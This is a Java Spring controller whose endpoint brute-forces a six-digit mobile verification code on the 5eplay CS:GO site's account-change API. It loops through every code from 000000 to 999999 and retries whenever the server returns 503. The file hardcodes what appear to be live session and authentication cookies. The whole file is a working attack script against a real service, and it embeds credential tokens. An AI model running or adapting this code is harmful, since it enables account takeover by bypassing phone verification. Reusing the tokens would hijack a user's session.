package com.example.steam.controller;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.arronlong.httpclientutil.HttpClientUtil;
import com.arronlong.httpclientutil.common.HttpConfig;
import com.arronlong.httpclientutil.common.HttpHeader;
import com.arronlong.httpclientutil.common.HttpMethods;
import com.arronlong.httpclientutil.common.HttpResult;
import com.arronlong.httpclientutil.exception.HttpProcessException;
import lombok.extern.slf4j.Slf4j;
import org.apache.http.Header;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RestController;

import java.util.HashMap;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

@RestController
@Slf4j
public class controller{

    @GetMapping(value = "test")
    public String doSomeTest(){
        Header[] headers = HttpHeader.custom().cookie("Hm_lvt_12861524735e59efe36180e8485a6c92=170184816; 5ewin_session_=e6iu63m7sgktotld768cmkf8dt6errbm; 5ewin_authtoken=24f9cedece0e1e8d46f2a596987d863091f87e24d350eee77c9ae3a2e5b37d672d75bdaebd397dd8d95bbef9baf6d05853ec4949b576e898c92610878979bc9bUZqF4IQdPFyxA5iNCbCkeRmOYS6wFE63ok%2FclgWcOc425fDzKkLiMiLtA64Njq261smeesDufwBSEqNC77DrDw%3D%3D; 5e_token=d22d62dae2ff5fdf8cb52f7a3a2bba39b777a044a3f2ad1b2d4ad720ddf88babc400f126e2ab902c0f0102a8fc81ca85e256445f72166aeebc52b7793d819f89J4JC%2FgJMsheVjfO3dYFM5vL2I3xXbn1ho2Fe3LrS88KhSprF0ohUHeSp0PEp5%2FsLzGUmCiu9Syy85MqOtgZmsA%3D%3D; 5e_session_=jbj1esutqhbuj6oempc4kigiqf440laq; acw_tc=700f252f17018482696247120eeaf655dee15387b2e22937b89e82327f; cdn_sec_tc=700f252f17018482696247120eeaf655dee15387b2e22937b89e82327f; sajssdk_2015_cross_new_user=1; sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2218c3e0fc30b7b-004fb6f51d259324-26031051-2073600-18c3e0fc30c4ba%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E7%9B%B4%E6%8E%A5%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC_%E7%9B%B4%E6%8E%A5%E6%89%93%E5%BC%80%22%2C%22%24latest_referrer%22%3A%22%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMThjM2UwZmMzMGI3Yi0wMDRmYjZmNTFkMjU5MzI0LTI2MDMxMDUxLTIwNzM2MDAtMThjM2UwZmMzMGM0YmEifQ%3D%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%2C%22%24device_id%22%3A%2218c3e0fc30b7b-004fb6f51d259324-26031051-2073600-18c3e0fc30c4ba%22%7D; gdxidpyhxdE=iWST5Ll3bOanGcchk1WW7XEo83T0WVCCh13mYcv6xE3Knn7sBptXZL53mu7GZDVdG4oz%5Ce1WcmbBAOfTSaJwWbXdiSeO7ZkmKN6zCsdRumwVbzmlT6qt39Z6KdJZ13QYiXfOIbnNaaw%2Bywpgx0AsHNfbe8J3NYWSzE3EhGfJkeGT0vR9%3A1701849352369; YD00460313051322%3AWM_NI=nGU5Cto64FtfScEi9JNJwpHa9QW2lKqnpI4nwTIFbpaf8KLoquriLKPXrjpImV%2BjdqcBeJWjlbYg7BMgctGGnGKrHnM5Dh%2FyGzM%2FsjSut39LCY5E4M9yqKmSW9KV5ozXelc%3D; YD00460313051322%3AWM_NIKE=9ca17ae2e6ffcda170e2e6eeb4b23f8af0b690fb79f2868aa7c15e929b9b87c53f97eabcb3ef66919e988bdb2af0fea7c3b92aae999bd6c280adeafca7f76e91bd8b8abc428e96b991cb6bfb8f99d3ef41b3b2c0aab766b58c87a7e17ca3baf8accf65b3abbe8acf419488be8bf343af8ae58be77ba19eababd662b0be9788b64a8fb9ad95c64dae998593cb668feb8c89ae7385a683d0f26291abbcd4bc488187fba6b747fba7bfacf05995e785b7b865ba88ab8de237e2a3; YD00460313051322%3AWM_TID=x5TDfPL66FhFAEABVQbQwcG41rkTb5S9; Hm_lpvt_12861524735e59efe36180e8485a6c92=1701848556").build();
        for(int i=0; i< 999999; i ++){
            String s = String.valueOf(i);
            while (s.length() < 6){
                s = "0" + s;
            }
            Map param = new HashMap();
            param.put("bind_channel" , "mobile");
            param.put("authcode" , s);
            HttpConfig httpConfig = HttpConfig.custom().url("https://csgo.5eplay.com/api/user/change_old_check").headers(headers).method(HttpMethods.POST).map(param);
            try {
                HttpResult httpResult = HttpClientUtil.sendAndGetResp(httpConfig);
                try{
                    JSONObject jsonObject = JSON.parseObject(httpResult.getResult());
                    String o = jsonObject.getString("message");
                    if(null == o){
                        continue;
                    }
                    log.info("验证码{} ,返回值{}", s ,unicodeDecode(o));
                }catch (Exception e){
                    if(!httpResult.getResult().contains("503 Service Temporarily Unavailable")){
                        log.info("返回值{}" , httpResult.getResult());
                    }
                    i = i -1;
                }

            } catch (HttpProcessException e) {
                throw new RuntimeException(e);
            }
        }
        return null;
    }


    public static String unicodeDecode(String string) {
        Pattern pattern = Pattern.compile("(\\\\u(\\p{XDigit}{4}))");
        Matcher matcher = pattern.matcher(string);
        char ch;
        while (matcher.find()) {
            ch = (char) Integer.parseInt(matcher.group(2), 16);
            string = string.replace(matcher.group(1), ch + "");
        }
        return string;
    }

    public static void main(String[] args) {

    }

}
